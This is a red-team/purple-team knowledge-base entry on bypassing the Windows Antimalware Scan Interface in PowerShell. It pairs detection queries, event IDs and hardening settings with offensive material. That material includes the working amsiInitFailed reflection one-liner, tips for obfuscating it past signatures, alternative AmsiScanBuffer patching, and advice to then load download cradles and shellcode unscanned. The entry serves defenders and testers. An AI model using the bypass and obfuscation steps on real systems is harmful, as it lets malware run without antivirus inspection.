name: AMSI Bypass (PowerShell In-Memory)
description: The Antimalware Scan Interface (AMSI) lets Defender inspect PowerShell/script content at runtime, right before execution - so it catches in-memory payloads that never touch disk. Bypassing AMSI in the current process (typically by flipping the amsiInitFailed flag via reflection, or patching AmsiScanBuffer in memory) blinds that runtime scanning so download-cradles and reflective loaders run clean.

examples.label: Reflection: flip amsiInitFailed in the current session
The raw string is signatured - split/obfuscate it

notes: AMSI bypass only affects the process you run it in - a fresh powershell.exe is protected again, so run the bypass first in each new session, before pulling any payload. Defender signatures the well-known one-liner itself, so you almost always need to obfuscate it (string concatenation, char codes, base64+IEX, reordering) or it gets caught on the way in. Alternatives to the reflection trick: patch AmsiScanBuffer in amsi.dll in memory, or use a hardware-breakpoint bypass. After AMSI is down, in-memory loaders (IEX download-cradle, Invoke-* tools) run without runtime inspection. This is exam-legal manual evasion.

references.title: MITRE ATT&CK - Impair Defenses: Disable or Modify Tools

recommended.note: With AMSI down, load shellcode reflectively in the same session.
Where AMSI fits in the detection picture.

defense.why_it_works: AMSI (Antimalware Scan Interface) is a Windows API that scripting engines (PowerShell, VBScript, JScript, .NET) call before executing code - passing the script content to the registered AV provider for scanning. AMSI bypass patches the AmsiScanBuffer function in the amsi.dll loaded into the current PowerShell process to always return AMSI_RESULT_CLEAN, or sets the amsiInitFailed field to prevent initialization. This affects only the current process and session.
defense.prerequisites: PowerShell execution (any policy). Ability to run the bypass code before the malicious script. The bypass targets the current process's in-memory amsi.dll.
defense.impact: T1562.001 Impair Defenses: Disable or Modify Tools + T1059.001 Command and Scripting Interpreter: PowerShell. Disables AMSI scanning for the current PowerShell session - all subsequent scripts execute without AV inspection. Required prerequisite for executing known offensive PowerShell tools (Mimikatz, PowerView, PowerUp) that would otherwise be caught by AMSI.
defense.detection:
AMSI Event Log: 1032 (AMSI session start) / 1033 (scan error) - when AMSI is patched mid-session, subsequent scans generate errors. ETW: Microsoft-Windows-AMSI/Operational provider logs bypass attempts. PowerShell Event 4104 SBL: the bypass code itself is logged (ironically, before AMSI is bypassed - or if the bypass fails). EDR: known bypass patterns in memory (reflection method access to amsiInitFailed).
Monitor processes and command-line arguments associated with disabling or modification of security software, log clearing, or modification of firewall rules. Detect unexpected processes accessing or writing to security tool configuration files. Monitor for modifications to firewall rules, registry keys related to security software, or changes to security agent processes (DET0014).
defense.artifacts: AMSI-Operational Event 1033: scan errors after bypass applied | PowerShell Event 4104: bypass code in SBL (logged before bypass takes effect) | EDR: AMSI patch pattern in memory | ETW AmsiScanBuffer hook detection
defense.splunk_spl:
index=wineventlog EventCode=4104 (ScriptBlockText="*amsiInitFailed*" OR ScriptBlockText="*AmsiUtils*" OR ScriptBlockText="*VirtualAlloc*" OR ScriptBlockText="*Reflection.Emit*")
| table _time, Computer, User, ScriptBlockText

index=wineventlog sourcetype="WinEventLog:Microsoft-Windows-Windows Defender/Operational" (EventCode=5001 OR EventCode=5007)
| table _time, Computer, New_Value
defense.sentinel_kql:
DeviceEvents
| where ActionType == "PowerShellCommand" and ProcessCommandLine has_any ("amsiInitFailed","AmsiUtils","VirtualAlloc","Reflection.Emit")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
| sort by Timestamp desc
// AMSI bypass (amsiInitFailed / AmsiUtils patch) then silent PowerShell
defense.prevention:
AMSI Tamper Protection: Defender Tamper Protection prevents patching of protected AMSI provider DLLs. ETW-based AMSI monitoring: Microsoft-Windows-AMSI/Operational events. Constrained Language Mode: prevents reflection-based bypasses. Protected Process Light for the AMSI provider. Keep AMSI provider updated with latest bypass signatures.
Restrict File and Directory Permissions: Ensure proper permissions on security tool configuration files, logs, and binaries to prevent modification.
User Account Management: Ensure proper user and access controls are in place for accounts that could be used to disable security software.
Software Configuration: Ensure security software is set to automatically restart on failure or shutdown.
defense.evasion: Obfuscate the bypass payload itself (concatenate strings, encode, use variable substitution) so the bypass is not caught by AMSI before it executes. Use Invoke-Obfuscation or manual obfuscation of 'amsiInitFailed' string. Use COM-based alternatives to PowerShell that don't have AMSI integration (wscript.exe with .vbs). Fork into a new PowerShell process with AMSI already patched.
defense.misconfiguration: AMSI Tamper Protection not enabled. ETW not monitored. CLM not enforced. AMSI provider signatures not updated (stale - known bypasses not detected).
defense.vulnerable_config:
# Tamper Protection off:
(Get-MpPreference).DisableTamperProtection  # True = tampering allowed
# → amsiInitFailed reflection bypass succeeds without detection

# CLM not enforced:
$ExecutionContext.SessionState.LanguageMode  # FullLanguage
# → reflection via [Ref].Assembly.GetType() fully accessible
defense.secure_config:
# Enable Tamper Protection:
# Defender Security Center → Virus & threat protection settings → Tamper Protection: ON
# Or via Intune/MDE

# WDAC to enforce CLM on non-admin hosts:
# CLM prevents: [Ref].Assembly.GetType() and other reflection-based bypasses

# Monitor AMSI events:
# SIEM: Microsoft-Windows-AMSI/Operational Event 1033 (scan error) → ALERT

# ETW rule:
# SilkETW + Microsoft-Windows-AMSI provider → log all AMSI bypass attempts

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Disables AMSI in the current PowerShell process so in-memory scripts run unscanned:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')   reflect the internal AMSI class
  .GetField('amsiInitFailed','NonPublic,Static')                    grab its private init-failed flag
  .SetValue($null,$true)                                            set it true so AMSI thinks init failed and stops scanning
After this, IEX/download-cradle payloads load without Defender inspecting them; obfuscate the string ('Am'+'si'+'Utils') because the literal is itself signatured.
